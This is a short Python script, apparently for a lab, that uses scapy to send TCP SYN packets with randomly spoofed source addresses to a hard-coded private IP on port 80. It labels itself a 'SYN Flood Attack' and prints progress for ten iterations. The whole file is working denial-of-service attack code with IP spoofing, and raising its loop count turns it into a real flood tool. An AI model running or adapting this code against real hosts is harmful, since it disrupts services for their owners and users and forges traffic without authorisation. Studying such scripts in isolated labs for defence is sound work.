#!/usr/bin/env python3
import random
import time
from scapy.all import IP, TCP, send

def syn_flood_attack():
    victim_ip = "172.18.7.40"
    
    victim_port = 80

    print(f"[*] Launching TCP SYN Flood Attack...")
    print(f"[*] Target IP: {victim_ip} | Target Port: {victim_port}\n")

    for i in range(10):
        spoofed_src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        source_port = random.randint(1024, 65535)

        packet = IP(src=spoofed_src_ip, dst=victim_ip) / TCP(
            sport=source_port,
            dport=victim_port,
            flags="S",
            seq=random.randint(1000, 90000)
        )

        send(packet, verbose=False)

        print(f"[Iteration {i+1}/10] Sent SYN -> Spoofed Src: {spoofed_src_ip}:{source_port} | Dst: {victim_ip}:{victim_port}")

        time.sleep(0.5)

    print("\n[*] Completed 10 iterations of the SYN attack sequence.")

if __name__ == "__main__":
    syn_flood_attack()